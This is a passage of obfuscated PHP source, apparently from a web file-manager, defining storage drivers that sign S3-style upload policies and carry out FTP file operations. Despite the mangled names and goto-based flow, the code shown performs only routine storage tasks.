<?php
 goto cŒ¸¬„áÁ; dŠŠÏÛ«Í: class PathDriverEDS extends PathDriverMinIO { public function __construct($bœÛ“˜‹²¡) { parent::__construct($bœÛ“˜‹²¡); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($E•‚Úì¤¼‰) { parent::__construct($E•‚Úì¤¼‰); $this->signatureVersion($_SERVER[ÒÆ›ÆØÎ¾][212]); } public function uploadFormData($F¯„´Œ’æ’, $D˜Ò»‚‰ê£ = 3600) { goto Bç–†Å¹’ˆ; E§Ô˜Ş¦˜Å: $AáÆê¶ãø = base64_encode(json_encode($fßëÕ¬Õ†ã)); $aô‡£§› = hash_hmac($D¦ÄèÁ÷š¦[1225], $B‰ˆµ›¡, $D¦ÄèÁ÷š¦[1226] . $this->secret, !0); $E¤Ñö†´˜à = hash_hmac($D¦ÄèÁ÷š¦[1225], $this->region, $aô‡£§›, !0); goto B•æÕÇóÆ; DôåÁØºÄ: $E¡òİ´ÜÜ = array($this->accessKey, $B‰ˆµ›¡, $this->region, $E®ˆŞÖÕ¨, $eã²ÊÏŠ¢¬); $bÁå¾ßô¼æ = implode($D¦ÄèÁ÷š¦[8], $E¡òİ´ÜÜ); $fßëÕ¬Õ†ã = array($D¦ÄèÁ÷š¦[1182] => gmdate($D¦ÄèÁ÷š¦[1181], strtotime($D¦ÄèÁ÷š¦[1218])), $D¦ÄèÁ÷š¦[1183] => array(array($D¦ÄèÁ÷š¦[1185] => $this->bucket), array($D¦ÄèÁ÷š¦[1184] => $cÀ‹ ÊÙ), array($D¦ÄèÁ÷š¦[1186], $D¦ÄèÁ÷š¦[1187], $D¦ÄèÁ÷š¦[33]), array($D¦ÄèÁ÷š¦[1186], $D¦ÄèÁ÷š¦[1219], $D¦ÄèÁ÷š¦[33]), array($D¦ÄèÁ÷š¦[1186], $D¦ÄèÁ÷š¦[1220], $D¦ÄèÁ÷š¦[33]), array($D¦ÄèÁ÷š¦[1188] => $bò¤¢Ê„ßÇ), array($D¦ÄèÁ÷š¦[1221] => $bÁå¾ßô¼æ), array($D¦ÄèÁ÷š¦[1222] => $F×çÅÌÅÈš), array($D¦ÄèÁ÷š¦[1223] => $eöĞÑ¬Æßñ), array($D¦ÄèÁ÷š¦[1224] => $FÒ‰©›¸º›))); goto E§Ô˜Ş¦˜Å; AïÀ‘òªœ: $b£íÂØ‚‘ = array($D¦ÄèÁ÷š¦[211] => $D¦ÄèÁ÷š¦[33], $D¦ÄèÁ÷š¦[1227] => $D¦ÄèÁ÷š¦[33], $D¦ÄèÁ÷š¦[1184] => $cÀ‹ ÊÙ, $D¦ÄèÁ÷š¦[1188] => $bò¤¢Ê„ßÇ, $D¦ÄèÁ÷š¦[1192] => $AáÆê¶ãø, $D¦ÄèÁ÷š¦[1228] => $bÁå¾ßô¼æ, $D¦ÄèÁ÷š¦[1229] => $F×çÅÌÅÈš, $D¦ÄèÁ÷š¦[1230] => $eöĞÑ¬Æßñ, $D¦ÄèÁ÷š¦[1231] => $FÒ‰©›¸º›, $D¦ÄèÁ÷š¦[1232] => $aÒ¤†©°í, $D¦ÄèÁ÷š¦[175] => $this->getHost()); return $b£íÂØ‚‘; goto D˜®ÈÇÎ†ø; E¸ÃŠõ: $eã²ÊÏŠ¢¬ = $D¦ÄèÁ÷š¦[1217]; $FÒ‰©›¸º› = $D˜Ò»‚‰ê£ . $D¦ÄèÁ÷š¦[33]; $bò¤¢Ê„ßÇ = $D¦ÄèÁ÷š¦[1180]; goto DôåÁØºÄ; B•æÕÇóÆ: $Dïâøæ¼»Î = hash_hmac($D¦ÄèÁ÷š¦[1225], $E®ˆŞÖÕ¨, $E¤Ñö†´˜à, !0); $e–‘ø™Ñ = hash_hmac($D¦ÄèÁ÷š¦[1225], $eã²ÊÏŠ¢¬, $Dïâøæ¼»Î, !0); $aÒ¤†©°í = hash_hmac($D¦ÄèÁ÷š¦[1225], $AáÆê¶ãø, $e–‘ø™Ñ); goto AïÀ‘òªœ; Bç–†Å¹’ˆ: $D¦ÄèÁ÷š¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cÀ‹ ÊÙ = $D¦ÄèÁ÷š¦[192]; $F×çÅÌÅÈš = $D¦ÄèÁ÷š¦[1215]; goto d‘ØšÎ§Ã; d‘ØšÎ§Ã: $E®ˆŞÖÕ¨ = $D¦ÄèÁ÷š¦[59]; $eöĞÑ¬Æßñ = gmdate($D¦ÄèÁ÷š¦[1216]); $B‰ˆµ›¡ = gmdate($D¦ÄèÁ÷š¦[703]); goto E¸ÃŠõ; D˜®ÈÇÎ†ø: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($aõ©•Œ¦…) { parent::__construct(); if (count($aõ©•Œ¦…) > 0) { $this->_init($aõ©•Œ¦…); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($c˜¯ÜµçŠá) { $D¾øÔÇ«¤Ô =& $_SERVER[ÒÆ›ÆØÎ¾]; global $config; $this->appCharset = $config[$D¾øÔÇ«¤Ô[1233]]; $this->systemCharset = $config[$D¾øÔÇ«¤Ô[1234]]; if (isset($c˜¯ÜµçŠá[$D¾øÔÇ«¤Ô[1235]]) && $c˜¯ÜµçŠá[$D¾øÔÇ«¤Ô[1235]]) { $this->systemCharset = $c˜¯ÜµçŠá[$D¾øÔÇ«¤Ô[1235]]; } } public function iconvApp($dœš¸¨ğ¸) { return $this->iconvTo($dœš¸¨ğ¸, $this->systemCharset, $this->appCharset); } public function iconvSystem($d›‰¢µòéë) { return $this->iconvTo($d›‰¢µòéë, $this->appCharset, $this->systemCharset); } public function getPathOuter($dçé½öƒÃ) { goto D¦ “Ò¤¿; FíÂ¢ÖŒÙ…: return $this->pathDriver . $FŠƒ‡ÛÂÅ[8] . ltrim($dçé½öƒÃ, $FŠƒ‡ÛÂÅ[8]); goto bˆ¸î„áÏŒ; f¬£ôÎäÎğ: $dçé½öƒÃ = KodIO::clear($dçé½öƒÃ); $dçé½öƒÃ = substr($dçé½öƒÃ, strlen($F±»²Ÿ§£Ã)); if (empty($this->pathDriver)) { return $dçé½öƒÃ; } goto FíÂ¢ÖŒÙ…; D¦ “Ò¤¿: $FŠƒ‡ÛÂÅ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F±»²Ÿ§£Ã = $this->iconvApp($this->pathBase); $dçé½öƒÃ = $this->iconvApp($dçé½öƒÃ); goto d±ğ£•”“; d±ğ£•”“: if (substr($F±»²Ÿ§£Ã, 0, 2) == $FŠƒ‡ÛÂÅ[1236]) { $F±»²Ÿ§£Ã = BASIC_PATH . substr($F±»²Ÿ§£Ã, 2); } if (substr($dçé½öƒÃ, 0, 2) == $FŠƒ‡ÛÂÅ[1236]) { $dçé½öƒÃ = BASIC_PATH . substr($dçé½öƒÃ, 2); } $F±»²Ÿ§£Ã = KodIO::clear($F±»²Ÿ§£Ã); goto f¬£ôÎäÎğ; bˆ¸î„áÏŒ: } private function _init($B ŠÙ¾‡ÚÃ = array()) { $bĞòÈ îâÅ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!function_exists($bĞòÈ îâÅ[1237])) { throw new Exception(LNG($bĞòÈ îâÅ[1238])); } $this->config = $B ŠÙ¾‡ÚÃ; $this->charsetReset($B ŠÙ¾‡ÚÃ); foreach ($B ŠÙ¾‡ÚÃ as $fÜ¯¸°”…½ => $Aë¾¿ê) { if (isset($this->{$fÜ¯¸°”…½})) { $this->{$fÜ¯¸°”…½} = $Aë¾¿ê; } } return $this->_login($B ŠÙ¾‡ÚÃ); } private function _login($B†£ôÅ…“æ) { goto Fò”£“øò; dÄÆ±ä…ÂĞ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Dù®áèÚë÷ = @ftp_login($this->connect, $this->username, $this->userpass); goto d—ï¡¢Ûİİ; Fò”£“øò: $aùÖÄ¨Ó‹Å =& $_SERVER[ÒÆ›ÆØÎ¾]; static $e—Ò­Û“³ = array(); $bğ£™Ş¡ô‘ = md5(json_encode($B†£ôÅ…“æ)); goto A¬ºÄ§‹¿; d—ï¡¢Ûİİ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Bš ¦Û©­æ = $this->pasv == $aùÖÄ¨Ó‹Å[87] ? !0 : !1; @ftp_pasv($this->connect, $Bš ¦Û©­æ); goto e½÷õ”‰¾£; A¬ºÄ§‹¿: if (isset($e—Ò­Û“³[$bğ£™Ş¡ô‘])) { foreach ($e—Ò­Û“³[$bğ£™Ş¡ô‘] as $bÚ©ƒÙÛç§ => $AÕÈéäí) { $this->{$bÚ©ƒÙÛç§} = $AÕÈéäí; } return !0; } $aÇìŸ¦©š = parse_url(trim($this->server, $aùÖÄ¨Ó‹Å[8])); $this->host = $aÇìŸ¦©š[$aùÖÄ¨Ó‹Å[175]]; goto d¬ë…ÒŒÈç; d¬ë…ÒŒÈç: $dƒªƒ§Âö = isset($aÇìŸ¦©š[$aùÖÄ¨Ó‹Å[174]]) && $aÇìŸ¦©š[$aùÖÄ¨Ó‹Å[174]] == $aùÖÄ¨Ó‹Å[1239] ? !0 : !1; $this->scheme = $dƒªƒ§Âö ? $aùÖÄ¨Ó‹Å[1240] : $aùÖÄ¨Ó‹Å[1241]; $this->port = isset($aÇìŸ¦©š[$aùÖÄ¨Ó‹Å[176]]) ? $aÇìŸ¦©š[$aùÖÄ¨Ó‹Å[176]] : 21; goto dÄÆ±ä…ÂĞ; e½÷õ”‰¾£: $e—Ò­Û“³[$bğ£™Ş¡ô‘] = array($aùÖÄ¨Ó‹Å[1242] => $this->connect, $aùÖÄ¨Ó‹Å[175] => $this->host, $aùÖÄ¨Ó‹Å[174] => $this->scheme, $aùÖÄ¨Ó‹Å[176] => $this->port); return $Dù®áèÚë÷; goto b®çé»œÎ¤; b®çé»œÎ¤: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($eĞ±Ö¿¼ï, $AÆµœ´ô‡ = '', $fÚ™İ¶ã–å = REPEAT_RENAME) { if ($this->setContent($eĞ±Ö¿¼ï, $AÆµœ´ô‡)) { return $this->getPathOuter($eĞ±Ö¿¼ï); } return !1; } public function mkdir($D²ºË¢ˆÏ, $f®Ï¹Óä–Û = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $D²ºË¢ˆÏ = $this->iconvSystem($D²ºË¢ˆÏ); if ($this->_isFolder($D²ºË¢ˆÏ) || @ftp_mkdir($this->connect, $D²ºË¢ˆÏ)) { return $this->getPathOuter($D²ºË¢ˆÏ); } if (!$this->mkdir($this->pathFather($D²ºË¢ˆÏ))) { return !1; } if ($D²ºË¢ˆÏ = @ftp_mkdir($this->connect, $D²ºË¢ˆÏ)) { return $this->getPathOuter($D²ºË¢ˆÏ); } return !1; } public function copyFile($B´ŸÑ«Å½•, $f†­«£Á¸‡) { goto E¨ççÃÉé; E¨ççÃÉé: if (!$this->_isconn()) { return !1; } $A¢²–³„ç = $this->pathThis($this->iconvSystem($B´ŸÑ«Å½•)); $c¡Õ‹§¡“– = $this->tempFile($A¢²–³„ç); goto eÏª‡ùÈ Ò; EÅ†çÀĞ é: $this->tempFileRemve($c¡Õ‹§¡“–); return $E¼ˆ‚‰‰ÜÊ; goto Fòç ’ÄÀ; eÏª‡ùÈ Ò: $CéìÈ‚™‘ƒ = $this->iconvApp($c¡Õ‹§¡“–); $this->download($B´ŸÑ«Å½•, $CéìÈ‚™‘ƒ); $E¼ˆ‚‰‰ÜÊ = $this->upload($f†­«£Á¸‡, $CéìÈ‚™‘ƒ); goto EÅ†çÀĞ é; Fòç ’ÄÀ: } public function moveFile($C²‘®‡Ú®÷, $BŒ¥©¼ÏÂÖ) { if (!$this->_isconn()) { return !1; } $C²‘®‡Ú®÷ = $this->iconvSystem($C²‘®‡Ú®÷); $BŒ¥©¼ÏÂÖ = $this->iconvSystem($BŒ¥©¼ÏÂÖ); $e‹†¾š‰ Ç = @ftp_rename($this->connect, $C²‘®‡Ú®÷, $BŒ¥©¼ÏÂÖ); return $e‹†¾š‰ Ç ? $this->getPathOuter($BŒ¥©¼ÏÂÖ) : !1; } public function delFile($aøù‰ëáñ¬) { if (!$this->_isconn()) { return !1; } $aøù‰ëáñ¬ = $this->iconvSystem($aøù‰ëáñ¬); return @ftp_delete($this->connect, $aøù‰ëáñ¬); } public function delFolder($Eß‚Êõ×ÅŞ) { goto b³ÛÏåæ¿‡; D‹–ÍŠóõç: $this->fileList($Eß‚Êõ×ÅŞ, $f‚ÕÇ¼Ğáœ, $E°ìö•»¾ã, !0); $this->listItemCache = !0; foreach ($E°ìö•»¾ã as $Bˆ„á´Ñ½å) { $fƒí‰™òö = $this->iconvSystem($Bˆ„á´Ñ½å[$_SERVER[ÒÆ›ÆØÎ¾][28]]); $aéöÑËŒ = @ftp_delete($this->connect, $fƒí‰™òö); if (!$aéöÑËŒ) { return !1; } } goto A¬¾º«Õ—Î; A¬¾º«Õ—Î: foreach ($f‚ÕÇ¼Ğáœ as $fƒí‰™òö) { $fƒí‰™òö = $this->iconvSystem($fƒí‰™òö); $aéöÑËŒ = @ftp_rmdir($this->connect, $fƒí‰™òö); if (!$aéöÑËŒ) { return !1; } } $Eß‚Êõ×ÅŞ = $this->iconvSystem($Eß‚Êõ×ÅŞ); return @ftp_rmdir($this->connect, $Eß‚Êõ×ÅŞ); goto BĞ»œÄÎå; b³ÛÏåæ¿‡: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $f‚ÕÇ¼Ğáœ = $E°ìö•»¾ã = array(); goto D‹–ÍŠóõç; BĞ»œÄÎå: } public function rename($Dã™Íö„İô, $D·º³ùÎ¿Š) { goto e‡²®çæ¾; e‡²®çæ¾: $fÁ·Šñƒ¤ó =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->_isconn()) { return !1; } $B¦ë÷Õ¦îÛ = $this->fileNameAuto($this->pathFather($Dã™Íö„İô), $D·º³ùÎ¿Š); goto CæèÂÉ »à; CæèÂÉ »à: $B¦ë÷Õ¦îÛ = $this->iconvSystem($B¦ë÷Õ¦îÛ); $Dã™Íö„İô = $this->iconvSystem($Dã™Íö„İô); $eÒÃ‘›¬øŠ = $this->pathFather($Dã™Íö„İô); goto DáĞ³õ“Ü; DáĞ³õ“Ü: $FÓòàåàÃµ = rtrim($eÒÃ‘›¬øŠ, $fÁ·Šñƒ¤ó[8]) . $fÁ·Šñƒ¤ó[8] . $B¦ë÷Õ¦îÛ; $dªÏã»¼„š = @ftp_rename($this->connect, $Dã™Íö„İô, $FÓòàåàÃµ); $FÓòàåàÃµ = $this->iconvApp($FÓòàåàÃµ); goto D‘˜»œâÍ; D‘˜»œâÍ: return $dªÏã»¼„š ? $this->getPathOuter($FÓòàåàÃµ) : !1; goto D³¸‰ŒÕŸŞ; D³¸‰ŒÕŸŞ: } private function folderInfo($EƒèË£ù¨ä, $C¿ò»¾Ïñ× = false) { $DŞë¢ÉÇ‡™ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BŠÌöÔõÕ‹ = array($DŞë¢ÉÇ‡™[28] => $this->pathThis($EƒèË£ù¨ä), $DŞë¢ÉÇ‡™[76] => $this->getPathOuter($DŞë¢ÉÇ‡™[8] . $EƒèË£ù¨ä), $DŞë¢ÉÇ‡™[29] => $DŞë¢ÉÇ‡™[77]); if ($C¿ò»¾Ïñ×) { return $BŠÌöÔõÕ‹; } $BŠÌöÔõÕ‹[$DŞë¢ÉÇ‡™[194]] = $BŠÌöÔõÕ‹[$DŞë¢ÉÇ‡™[84]] = 0; $BŠÌöÔõÕ‹[$DŞë¢ÉÇ‡™[195]] = $BŠÌöÔõÕ‹[$DŞë¢ÉÇ‡™[196]] = !0; return $BŠÌöÔõÕ‹; } private function fileInfo($DÂÚÃ•´Àµ, $D™—°ÁÄ“ = false, $dä¶¾øÙ = array()) { goto Bö»Æ÷ß§; aÚ¬™¦ñ†Ú: $D†ÒÍÜ•ªé[$Cö°©Ğ´ô[194]] = $D†ÒÍÜ•ªé[$Cö°©Ğ´ô[84]] = 0; $D†ÒÍÜ•ªé[$Cö°©Ğ´ô[195]] = $D†ÒÍÜ•ªé[$Cö°©Ğ´ô[196]] = !0; $aĞŒÀ–†—® = $this->iconvSystem($DÂÚÃ•´Àµ); goto AËîõ•×Šå; AËîõ•×Šå: $D†ÒÍÜ•ªé[$Cö°©Ğ´ô[84]] = @ftp_mdtm($this->connect, $aĞŒÀ–†—®); if (empty($dä¶¾øÙ)) { $dä¶¾øÙ = $this->objectMeta($DÂÚÃ•´Àµ); if (!$dä¶¾øÙ) { return $D†ÒÍÜ•ªé; } } $D†ÒÍÜ•ªé[$Cö°©Ğ´ô[78]] = $dä¶¾øÙ[$Cö°©Ğ´ô[78]]; goto f¡¤ÀÎâ¹; f¡¤ÀÎâ¹: return $D†ÒÍÜ•ªé; goto b¶íˆ®ä˜; Bö»Æ÷ß§: $Cö°©Ğ´ô =& $_SERVER[ÒÆ›ÆØÎ¾]; $D†ÒÍÜ•ªé = array($Cö°©Ğ´ô[28] => $this->pathThis($DÂÚÃ•´Àµ), $Cö°©Ğ´ô[76] => $this->getPathOuter($Cö°©Ğ´ô[8] . $DÂÚÃ•´Àµ), $Cö°©Ğ´ô[29] => $Cö°©Ğ´ô[193], $Cö°©Ğ´ô[78] => isset($dä¶¾øÙ[$Cö°©Ğ´ô[78]]) ? $dä¶¾øÙ[$Cö°©Ğ´ô[78]] : 0, $Cö°©Ğ´ô[168] => $this->ext($DÂÚÃ•´Àµ)); if ($D™—°ÁÄ“) { return $D†ÒÍÜ•ªé; } goto aÚ¬™¦ñ†Ú; b¶íˆ®ä˜: } public function size($BöŸÖº‚±) { $B•®±¤ê¨ò = $this->objectMeta($BöŸÖº‚±); return $B•®±¤ê¨ò ? $B•®±¤ê¨ò[$_SERVER[ÒÆ›ÆØÎ¾][78]] : 0; } public function info($d‘ïöš›º°) { if ($this->isFile($d‘ïöš›º°)) { return $this->fileInfo($d‘ïöš›º°, 0); } else { if ($this->isFolder($d‘ïöš›º°)) { return $this->folderInfo($d‘ïöš›º°); } } return !1; } private function fileList($DäØà£ÛÉà, &$D¥Óåàğ¯, &$f©‘‰ƒò¥ø, $eŠÛÍÔ—ˆ¹ = false) { goto aäÊªë¿ë; aäÊªë¿ë: $Dİªå™—±± =& $_SERVER[ÒÆ›ÆØÎ¾]; $DäØà£ÛÉà = $this->iconvSystem($DäØà£ÛÉà); if (!$this->isFolder($DäØà£ÛÉà)) { return !1; } goto eæÎ§ãÄ«; f×¶™•ÀÙ: $E•ƒ×ë©‘ç = $this->listItemCache === !1 ? !1 : !0; $Bµš¢Ô÷±¥ = @ftp_rawlist($this->connect, $DäØà£ÛÉà); if (!$Bµš¢Ô÷±¥) { $Bµš¢Ô÷±¥ = array(); } goto a³ê‰Çå‚; a³ê‰Çå‚: $EØª©š£ƒ› = array($Dİªå™—±±[95] => 1, $Dİªå™—±±[1243] => 1); foreach ($Bµš¢Ô÷±¥ as $E¢‡Üííò) { goto Fàó„Şø¨; Fàó„Şø¨: $Fò‘¡ñëÀŞ = $this->_listItem($E¢‡Üííò); if ($Fò‘¡ñëÀŞ[0] == $Dİªå™—±±[711]) { continue; } $bè¬ÑÏó = $Fò‘¡ñëÀŞ[8]; goto CŒÇŸ²›É; E”Åˆ‹Š²: if ($C³­ÌË‘Ó¡) { $D¥Óåàğ¯[] = $bè¬ÑÏó; if ($eŠÛÍÔ—ˆ¹) { $this->fileList($bè¬ÑÏó, $D¥Óåàğ¯, $f©‘‰ƒò¥ø, $eŠÛÍÔ—ˆ¹); } continue; } $f©‘‰ƒò¥ø[] = $C¾ƒ…´Î™; goto d Ê¤øçâ; D…İ©·£§ö: if (substr($E¢‡Üííò, 0, 1) == $Dİªå™—±±[1244]) { $C¾ƒ…´Î™[$Dİªå™—±±[29]] = $Dİªå™—±±[77]; $C¾ƒ…´Î™[$Dİªå™—±±[78]] = 0; } $C³­ÌË‘Ó¡ = $C¾ƒ…´Î™[$Dİªå™—±±[29]] == $Dİªå™—±±[77] ? !0 : !1; if ($E•ƒ×ë©‘ç) { $this->cacheMethod($Dİªå™—±±[199], $bè¬ÑÏó, $C³­ÌË‘Ó¡); $this->cacheMethod($Dİªå™—±±[200], $bè¬ÑÏó, $C¾ƒ…´Î™); } goto E”Åˆ‹Š²; CŒÇŸ²›É: if (empty($bè¬ÑÏó) && $bè¬ÑÏó !== $Dİªå™—±±[191] || isset($EØª©š£ƒ›[$bè¬ÑÏó])) { continue; } $bè¬ÑÏó = $this->iconvApp($DäØà£ÛÉà . ltrim($bè¬ÑÏó, $Dİªå™—±±[8])); $C¾ƒ…´Î™ = array($Dİªå™—±±[28] => $bè¬ÑÏó, $Dİªå™—±±[29] => $Dİªå™—±±[193], $Dİªå™—±±[78] => $Fò‘¡ñëÀŞ[4]); goto D…İ©·£§ö; d Ê¤øçâ: } if ($E•ƒ×ë©‘ç) { $this->cacheMethod($Dİªå™—±±[199], $DäØà£ÛÉà, !0); } goto eá‰Š¦…½½; eæÎ§ãÄ«: @ftp_chdir($this->connect, $Dİªå™—±±[8]); $DäØà£ÛÉà = rtrim($DäØà£ÛÉà, $Dİªå™—±±[8]) . $Dİªå™—±±[8]; check_abort(); goto f×¶™•ÀÙ; eá‰Š¦…½½: } private function _listItem($CÚÈ’ğ¸) { if (empty($CÚÈ’ğ¸)) { return array(); } $c‰ËˆÖ‡ÏÓ = preg_split($_SERVER[ÒÆ›ÆØÎ¾][1245], $CÚÈ’ğ¸); if (count($c‰ËˆÖ‡ÏÓ) <= 9) { return $c‰ËˆÖ‡ÏÓ; } $c‰ËˆÖ‡ÏÓ[8] = trim(substr($CÚÈ’ğ¸, strpos($CÚÈ’ğ¸, $c‰ËˆÖ‡ÏÓ[7]) + strlen($c‰ËˆÖ‡ÏÓ[7]))); return array_splice($c‰ËˆÖ‡ÏÓ, 0, 9); } public function listPath($CŠÕ‰ª“é², $a–«ù×ÍÖè = false) { goto AäŸã‰ìØÙ; AäŸã‰ìØÙ: $bêÕ©·É¶Ó =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->_isconn()) { return !1; } $e¹£¹õÓ¬¦ = $BÃ›Ôß‰©« = array(); goto f–´œ¡íÄ; f–´œ¡íÄ: $this->fileList($CŠÕ‰ª“é², $e¹£¹õÓ¬¦, $BÃ›Ôß‰©«); foreach ($e¹£¹õÓ¬¦ as $AŞğÛ÷­Í => $B›Ğ¬“¨…°) { $e¹£¹õÓ¬¦[$AŞğÛ÷­Í] = $this->folderInfo($B›Ğ¬“¨…°, $a–«ù×ÍÖè); } foreach ($BÃ›Ôß‰©« as $AŞğÛ÷­Í => $B›Ğ¬“¨…°) { $BÃ›Ôß‰©«[$AŞğÛ÷­Í] = $this->fileInfo($B›Ğ¬“¨…°[$bêÕ©·É¶Ó[28]], $a–«ù×ÍÖè, $B›Ğ¬“¨…°); } goto Bæ¹’’´²Š; Bæ¹’’´²Š: return array($bêÕ©·É¶Ó[75] => $e¹£¹õÓ¬¦, $bêÕ©·É¶Ó[74] => $BÃ›Ôß‰©«); goto cªÖ«Ì˜Áµ; cªÖ«Ì˜Áµ: } public function has($e«å‹¼Ó, $b•àíæÙŒ = false, $eó“¹‰ˆ¨‹ = true) { goto EÙª˜é Œ; EÙª˜é Œ: $f´†²ŞŸ  =& $_SERVER[ÒÆ›ÆØÎ¾]; $bø†ĞÁ» = $B’œ¬¹“ìŸ = array(); $A¬˜íîĞÓ¸ = $b•àíæÙŒ ? !0 : !1; goto Aì›‘†Ï‚–; Aì›‘†Ï‚–: $this->fileList($e«å‹¼Ó, $bø†ĞÁ», $B’œ¬¹“ìŸ, $A¬˜íîĞÓ¸); if ($b•àíæÙŒ) { return array($f´†²ŞŸ [203] => count($B’œ¬¹“ìŸ), $f´†²ŞŸ [204] => count($bø†ĞÁ»)); } if ($eó“¹‰ˆ¨‹) { if (count($B’œ¬¹“ìŸ)) { return !0; } } else { if (count($bø†ĞÁ»)) { return !0; } } goto e¸é¡ˆ¾Ô¨; e¸é¡ˆ¾Ô¨: return !1; goto fÇ×‘÷ ˆ²; fÇ×‘÷ ˆ²: } public function listAll($FŒñÛãÃ–Š) { goto dÔÚÊ«¹·§; b­ŸŸ£ÇŒ¬: $this->fileList($FŒñÛãÃ–Š, $FªØš•ãªÇ, $d³ÏÏÄÓˆ, !0); $eÛ‰Âˆïğ® = array(); foreach ($d³ÏÏÄÓˆ as $eŞ ŞÄŞŠÃ) { $eÛ‰Âˆïğ®[$eŞ ŞÄŞŠÃ[$AÒµ˜É´Ê¦[28]]] = $eŞ ŞÄŞŠÃ[$AÒµ˜É´Ê¦[78]]; } goto a¼óÕŒ·; a¼óÕŒ·: foreach ($FªØš•ãªÇ as $eŞ ŞÄŞŠÃ) { if (is_string($eŞ ŞÄŞŠÃ)) { $eÛ‰Âˆïğ®[$eŞ ŞÄŞŠÃ] = 0; } } return $this->listAllFiles($FŒñÛãÃ–Š, array_keys($eÛ‰Âˆïğ®), $eÛ‰Âˆïğ®); goto aø±Œ²·°„; dÔÚÊ«¹·§: $AÒµ˜É´Ê¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->_isconn()) { return !1; } $FªØš•ãªÇ = $d³ÏÏÄÓˆ = array(); goto b­ŸŸ£ÇŒ¬; aø±Œ²·°„: } public function getContent($fœ¬ˆ²·¤Ø) { if (!$this->_isconn()) { return !1; } $fœ¬ˆ²·¤Ø = $this->iconvSystem($fœ¬ˆ²·¤Ø); return $this->fileSubstr($fœ¬ˆ²·¤Ø); } public function setContent($F£Ç›¹»à”, $bĞóÒî’¬ë = '') { goto fƒŠ³‡‡æœ; båª·óš: return $a‹·ÉŒÌŞ; goto BËÆÚİò”¸; eœâ´ŠØ¶Ü: file_put_contents($dÍ«•ô’ì§, $bĞóÒî’¬ë); $a‹·ÉŒÌŞ = $this->upload($F£Ç›¹»à”, $this->iconvApp($dÍ«•ô’ì§)); $this->tempFileRemve($dÍ«•ô’ì§); goto båª·óš; fƒŠ³‡‡æœ: if (!$this->_isconn()) { return !1; } $DÍ¿‡¦±„å = $this->pathThis($this->iconvSystem($F£Ç›¹»à”)); $dÍ«•ô’ì§ = $this->tempFile($DÍ¿‡¦±„å); goto eœâ´ŠØ¶Ü; BËÆÚİò”¸: } public function fileSubstr($Bêóˆ®¿ñ, $bæëÒ£ÕÈÑ = 0, $EöòŒÁÄÊ£ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Bêóˆ®¿ñ, $bæëÒ£ÕÈÑ, $EöòŒÁÄÊ£); } private function ftpRequest($c®Š’‚İ÷‘, $B¨ÌßÄœ½ = 0, $b¢Œ‚å¡ò = false) { goto cƒ®†ÜÏƒ„; b”ŞéäØ‰»: return $Fã‰’Ú´Æ; goto dö“ÖÛ¢ê; cƒ®†ÜÏƒ„: $c®Š’‚İ÷‘ = $this->iconvSystem($c®Š’‚İ÷‘); $BÌ’î›¦õ = $this->scheme . $this->host . $_SERVER[ÒÆ›ÆØÎ¾][4] . $this->port; $fÁÚ¨Ò„™â = curl_init(); goto dôâ±÷¥Ç„; dèäìŒÏß: curl_setopt($fÁÚ¨Ò„™â, CURLOPT_RETURNTRANSFER, 1); $Fã‰’Ú´Æ = curl_exec($fÁÚ¨Ò„™â); curl_close($fÁÚ¨Ò„™â); goto b”ŞéäØ‰»; dôâ±÷¥Ç„: curl_setopt($fÁÚ¨Ò„™â, CURLOPT_URL, $BÌ’î›¦õ . $this->pathEncode($c®Š’‚İ÷‘)); curl_setopt($fÁÚ¨Ò„™â, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($b¢Œ‚å¡ò) { $b‘ÔÔ¤óç® = $B¨ÌßÄœ½ + $b¢Œ‚å¡ò - 1; curl_setopt($fÁÚ¨Ò„™â, CURLOPT_RANGE, "{$B¨ÌßÄœ½}\55{$b‘ÔÔ¤óç®}"); } goto dèäìŒÏß; dö“ÖÛ¢ê: } public function upload($f×÷Í™ƒ, $EåÒ¹İ–¤³, $DìÓë“ğ¦ = false, $AÒğ÷É‘…² = REPEAT_REPLACE) { goto fÌ†§¾›Â§; fÌ†§¾›Â§: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($f×÷Í™ƒ))) { return !1; } $f×÷Í™ƒ = $this->iconvSystem($f×÷Í™ƒ); goto aÃù×ãªìã; aÃù×ãªìã: $EåÒ¹İ–¤³ = $this->iconvSystem($EåÒ¹İ–¤³); $CÓëÙÎ½©ã = ftp_nb_put($this->connect, $f×÷Í™ƒ, $EåÒ¹İ–¤³, FTP_BINARY); while ($CÓëÙÎ½©ã == FTP_MOREDATA) { $CÓëÙÎ½©ã = ftp_nb_continue($this->connect); } goto fÁ¤ ß©Ô†; fÁ¤ ß©Ô†: if ($CÓëÙÎ½©ã != FTP_FINISHED) { return !1; } return $this->getPathOuter($f×÷Í™ƒ); goto BŠ‡¨ì„‘ß; BŠ‡¨ì„‘ß: } public function download($e™Ï²Ç‰«, $cô´ôÍ¹¥‹ = '') { goto E÷çÏ¡ä¡; f…ÑìÃêÛç: $e™Ï²Ç‰« = $this->iconvSystem($e™Ï²Ç‰«); $cô´ôÍ¹¥‹ = $this->iconvSystem($cô´ôÍ¹¥‹); $EÛ»œ¸ï® = ftp_nb_get($this->connect, $cô´ôÍ¹¥‹, $e™Ï²Ç‰«, FTP_BINARY); goto FÎ’ƒÂÜÓÇ; E÷çÏ¡ä¡: if (!$this->_isconn()) { return !1; } $BÆ¹àÅÇÒì = $this->pathFather($cô´ôÍ¹¥‹); if 